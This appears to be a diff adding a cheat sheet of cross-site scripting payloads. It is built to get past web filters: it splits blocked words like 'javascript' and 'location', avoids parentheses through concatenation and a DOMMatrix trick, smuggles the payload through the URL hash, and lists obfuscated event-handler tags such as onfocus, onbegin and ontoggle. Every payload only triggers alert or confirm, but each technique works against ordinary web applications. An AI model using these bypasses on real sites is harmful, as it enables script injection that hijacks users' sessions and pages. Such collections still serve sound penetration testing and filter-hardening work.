@@ -1,0 +1,48 @@
+Bypass Parentheses:
+var pc = ")";
+var po = "(";
+location='javascript:alert'+po+'origin'+pc
+
+
+You can bypass any filtered words like alert or javascript:
+var pc = ")";
+var po = "(";
+var j = "javas";
+var s = "cript";
+location=j+s+':alert'+po+'origin'+pc
+
+
+If location word was filtered, Use payloads like this:
+var pc = ")";
+var po = "(";
+var l = "loca";
+var t = "tion";
+self[l+t]='javascript:alert'+po+'origin'+pc
+
+
+The main idea comes from @garethheyes research:
+https://portswigger.net/research/javascript-without-parentheses-using-dommatrix
+
+x=new DOMMatrix;
+matrix=alert;
+x.a=23;
+location='javascript'+':'+x
+
+
+Another nice payload that full payload not send to backend:
+
+location=frames.location.hash[1]+frames.location.hash[2]+frames.location.hash[3]+frames.location.hash[4]+frames.location.hash[5]+frames.location.hash[6]+frames.location.hash[7]+frames.location.hash[8]+frames.location.hash[9]+frames.location.hash[10]+frames.location.hash[11]+frames.location.hash[12]+frames.location.hash[13]+frames.location.hash[14]+frames.location.hash[15]+frames.location.hash[16]+frames.location.hash[17]+frames.location.hash[18]+frames.location.hash[19]
+And put #javascript:alert(1) in the end of URL
+
+
+Some Random Payloads:
+
+<deTaiLS/oPen/OntoGGle=alert(1)>
+
+<A Href=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+
+<svg><animate onbegin=alert() attributeName=x></svg>
+
+<lol/onauxclick=[origin].some(confirm)>rightclickhere
+
+<lol/contenteditable/autofocus/onfocus="alert(1)">
